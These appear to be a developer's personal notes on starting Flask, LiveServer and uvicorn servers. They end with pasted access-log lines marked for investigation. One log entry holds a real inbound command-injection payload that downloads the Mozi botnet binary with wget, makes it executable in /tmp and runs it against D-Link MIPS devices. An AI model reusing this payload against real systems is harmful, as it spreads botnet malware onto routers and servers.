# Notes


## Flash 
- pip3 install flask
- from flask import flash

- export FLASK_APP=app.py
- export FLASK_ENV=development

- flask run
flask run -h 0.0.0.0 -p 8080

## Cheat cheat
- curl cht.sh/python/flask


## Live server
from liveserver import LiveServer
ls = LiveServer(app)
    ls.run("0.0.0.0", 8080)

## uvicorn
uvicorn app:app --reload --port 80 --host 0.0.0.0


investigate from new TODO API Server
71.215.97.89 - - [13/May/2022 12:10:58] "GET /loadsavedtodo HTTP/1.1" 200 -
112.220.89.114 - - [13/May/2022 12:26:43] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
112.220.89.114 - - [13/May/2022 12:26:43] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -